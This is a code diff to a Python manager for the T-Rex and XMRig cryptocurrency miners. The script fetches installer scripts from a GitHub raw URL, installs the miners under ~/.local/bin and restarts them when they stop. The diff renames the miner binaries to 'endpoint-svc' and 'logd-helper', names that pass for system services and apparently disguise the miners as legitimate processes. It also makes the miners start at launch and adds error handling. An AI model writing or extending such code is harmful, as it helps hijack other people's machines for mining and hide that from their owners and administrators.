@@ -17,7 +17,7 @@ INSTALL_DIR = os.path.expanduser("~/.local/bin")
 TREX_CONFIG = {
     "SCRIPT_URL": "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/trex.sh",
     "INSTALLER_NAME": "install_t.sh",
-    "BINARY_NAME": "TREX_BIN",
+    "BINARY_NAME": "endpoint-svc",
     "LOG_FILE": "t.log",
     "API_PORT": 60000,
     "API_TYPE": "trex",
@@ -27,7 +27,7 @@ TREX_CONFIG = {
 XMRIG_CONFIG = {
     "SCRIPT_URL": "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/ocean.sh",
     "INSTALLER_NAME": "install_x.sh",
-    "BINARY_NAME": "XMRIG_BIN",
+    "BINARY_NAME": "logd-helper",
     "LOG_FILE": "x.log",
     "API_PORT": 60001,
     "API_TYPE": "xmrig",
@@ -138,14 +138,23 @@ def manage_miner(action):
             api_type = config["API_TYPE"]
 
             if api_type == "trex":
-                url = f'http://127.0.0.1:{api_port}/control?pause={"pause" == action}&sid={config["API_KEY"]}'
-                data = json.loads(urllib.request.urlopen(
-                    urllib.request.Request(url, method='GET'),
-                    timeout=2
-                ).read().decode('utf-8'))
-                if data.get("success", 0) == 0:
-                    err = data.get("error", "")
-                    print(f"Failed to {action} TREX via API. Reason: {err}")
+                url = (f'http://127.0.0.1:{api_port}/control'
+                       f'?pause={"stop" == action}&sid={config["API_KEY"]}')
+                try:
+                    data = json.loads(urllib.request.urlopen(
+                        urllib.request.Request(url, method='GET'),
+                        timeout=2
+                    ).read().decode('utf-8'))
+                    if data.get("success", 0) == 0:
+                        err = data.get("error", "")
+                        print(f"Failed to {action} TREX via API. Reason: {err}")
+                except urllib.error.URLError as e:  # Ловим конкретную ошибку urllib
+                    print(f"Failed to {action} TREX via API. URLError: {e}")
+                except json.JSONDecodeError as e:  # Ловим ошибку парсинга JSON
+                    print(f"Failed to {action} TREX via API. JSON decode error: {e}")
+                except Exception as e:  # Ловим любую другую ошибку при обращении к API
+                    print(f"Failed to {action} TREX via API. General error: {e}")
+
             elif api_type == "xmrig":
                 headers = {
                     'Content-Type': 'application/json',
@@ -157,18 +166,23 @@ def manage_miner(action):
                     "method": action,
                     "params": {}
                 }).encode("utf-8")
-                urllib.request.urlopen(
-                    urllib.request.Request(
-                        url=f'http://127.0.0.1:{api_port}/json_rpc',
-                        headers=headers,
-                        data=body,
-                        method='POST'
-                    ),
-                    timeout=2
-                )
+                try:
+                    urllib.request.urlopen(
+                        urllib.request.Request(
+                            url=f'http://127.0.0.1:{api_port}/json_rpc',
+                            headers=headers,
+                            data=body,
+                            method='POST'
+                        ),
+                        timeout=2
+                    )
+                except urllib.error.URLError as e:  # Ловим конкретную ошибку urllib
+                    print(f"Failed to {action} XMRig via API. URLError: {e}")
+                except Exception as e:  # Ловим любую другую ошибку при обращении к API
+                    print(f"Failed to {action} XMRig via API. General error: {e}")
 
         except Exception as err:
-            print(f"Failed to {action} miner via API. Reason: {err}")
+            print(f"Unexpected error in manage_miner loop for {config['BINARY_NAME']}. Reason: {err}")
             if action == 'resume':
                 if not get_pid_by_name(config["BINARY_NAME"]):
                     print(f"Miner {config['BINARY_NAME']} is not running. Attempting to restart via script...")
@@ -196,8 +210,7 @@ try:
         print(f"Error during T-Rex login attempt: {e}")
 
     time.sleep(2)
-    # Вызов manage_miner('resume') при старте
-    manage_miner('resume')
+    manage_miner('start')
 
 except Exception as e:
     print(f"Critical error in MINER MANAGER: {e}")
